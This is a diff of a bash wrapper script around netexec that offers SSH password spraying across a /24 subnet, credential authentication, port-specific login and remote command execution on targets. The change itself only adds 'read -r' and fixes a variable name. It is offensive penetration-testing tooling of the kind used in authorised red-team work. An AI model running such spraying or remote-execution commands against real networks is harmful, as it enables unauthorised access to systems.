@@ -239,33 +239,33 @@ if [ "$type" -eq 1 ]; then
             # Handle different attack paths for SSH
             case "$attack_type_ssh" in
                 1)  echo "Enter the full directory for the userfile"
-		    read user_file
+		    read -r user_file
 		    echo "Enter the full directory for the passwordfile"
-		    read pass_file
-		    ssh_host1="netexec ssh $target_ip/24 -u $user_file -p $passfile --no-bruteforce"
+		    read -r pass_file
+		    ssh_host1="netexec ssh $target_ip/24 -u $user_file -p $pass_file --no-bruteforce"
 		    echo "[+] Spraying Passwords..."
 		    $ssh_host1
                     ;;
                 2)  echo "Input Username"
-                    read ssh_user
+                    read -r ssh_user
 		    echo "Input Password"
-		    read ssh_pass
+		    read -r ssh_pass
 		    ssh_host2="netexec ssh $target_ip/24 -u $ssh_user -p $ssh_pass"
 		    echo "[+] Authenticating accross the domain.."
 		    $ssh_host2
                     ;;
                 3)  echo "Enter the specific port for authentication"
-		    read ssh_port
+		    read -r ssh_port
 		    ssh_host3="netexec ssh $target_ip/24 --port $ssh_port"
 		    echo "[+] Authenticating over Port $ssh_port..."
 		    $ssh_host3
                     ;;
                 4)  echo "Input Username"
-		    read ssh_user
+		    read -r ssh_user
 		    echo "Input Password"
-		    read ssh_pass
+		    read -r ssh_pass
 		    echo "What command do you want to execute on the host [Example: whoami]"
-		    read ssh_command
+		    read -r ssh_command
 		    ssh_host4="netexec ssh $target_ip/24 -u $ssh_user -p $ssh_pass -x $ssh_command"
 		    echo "[+] Executing the command on the target..."
 		    $ssh_host4
